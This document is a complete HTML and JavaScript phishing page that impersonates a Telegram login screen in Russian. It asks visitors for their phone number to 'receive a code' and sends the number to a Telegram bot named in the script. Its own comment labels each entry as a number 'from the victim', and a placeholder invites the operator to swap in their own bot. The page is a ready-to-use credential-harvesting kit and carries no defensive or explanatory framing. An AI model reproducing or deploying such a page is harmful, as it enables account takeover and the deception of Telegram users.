<!DOCTYPE html>
<html>
<head>
    <title>Telegram Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .title {
            font-size: 24px;
            font-weight: 600;
            color: #000;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #666;
            line-height: 1.4;
        }
        
        .phone-input {
            margin-bottom: 20px;
        }
        
        .input-group {
            display: flex;
            border: 2px solid #e1e5e9;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        
        .prefix {
            padding: 15px;
            background: #f8f9fa;
            border-right: 2px solid #e1e5e9;
            font-weight: 600;
            color: #333;
        }
        
        .phone-input input {
            flex: 1;
            border: none;
            outline: none;
            padding: 15px;
            font-size: 16px;
            background: white;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            background: #0088cc;
            color: white;
        }
        
        .btn:hover {
            background: #0077bb;
            transform: translateY(-2px);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
        }
        
        .success {
            display: none;
            text-align: center;
            color: #00a884;
            font-weight: 600;
            margin-top: 15px;
        }
        
        .error {
            display: none;
            text-align: center;
            color: #ff4444;
            font-weight: 600;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🔐</div>
            <div class="title">Вход в Telegram</div>
            <div class="subtitle">Введите ваш номер телефона для получения кода подтверждения</div>
        </div>
        
        <div class="phone-input">
            <div class="input-group">
                <div class="prefix" id="prefix">+7</div>
                <input type="tel" id="phone" placeholder="912 345 67 89" inputmode="numeric" maxlength="15">
            </div>
        </div>
        
        <button class="btn" onclick="sendPhoneNumber()">ПОЛУЧИТЬ КОД</button>
        
        <div class="loading" id="loading">
            ⏳ Отправка запроса...
        </div>
        
        <div class="success" id="success">
            ✅ Запрос отправлен! Код придет в Telegram
        </div>
        
        <div class="error" id="error">
            ❌ Ошибка отправки
        </div>
    </div>

    <script>
        function sendPhoneNumber() {
            const phoneInput = document.getElementById('phone');
            const prefix = document.getElementById('prefix').textContent;
            const phoneNumber = prefix + phoneInput.value.replace(/\D/g, '');
            
            if (!phoneInput.value) {
                showError('Введите номер телефона');
                return;
            }
            
            if (phoneInput.value.replace(/\D/g, '').length < 10) {
                showError('Номер слишком короткий');
                return;
            }
            
            showLoading();
            
            // Формируем сообщение для бота
            const message = `НОВЫЙ НОМЕР ОТ ЖЕРТВЫ\n${phoneNumber}`;
            
            // Отправляем через Telegram WebApp
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.sendData(JSON.stringify({
                    phone: phoneNumber,
                    action: 'request_code'
                }));
                showSuccess();
            } else {
                // Альтернативный способ - открываем ссылку на бота
                const botUsername = 'Stars_via_bot'; // Замените на username вашего бота
                const url = `https://t.me/${botUsername}?start=phone_${btoa(phoneNumber)}`;
                window.open(url, '_blank');
                showSuccess();
            }
        }
        
        function showLoading() {
            document.getElementById('loading').style.display = 'block';
            document.getElementById('success').style.display = 'none';
            document.getElementById('error').style.display = 'none';
        }
        
        function showSuccess() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('success').style.display = 'block';
            document.getElementById('error').style.display = 'none';
            
            // Автоматически закрыть через 3 секунды
            setTimeout(() => {
                if (window.Telegram && Telegram.WebApp) {
                    Telegram.WebApp.close();
                }
            }, 3000);
        }
        
        function showError(message) {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('success').style.display = 'none';
            document.getElementById('error').style.display = 'block';
            document.getElementById('error').textContent = '❌ ' + message;
        }
        
        // Форматирование номера телефона
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 0) {
                value = value.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
            }
            this.value = value;
        });
        
        // Инициализация Telegram WebApp
        document.addEventListener('DOMContentLoaded', function() {
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.ready();
                Telegram.WebApp.expand();
                
                // Обработка данных от бота
                Telegram.WebApp.onEvent('themeChanged', function() {
                    document.body.setAttribute('style', '--tg-theme-bg-color: ' + Telegram.WebApp.backgroundColor);
                });
            }
        });
    </script>
</body>
</html>
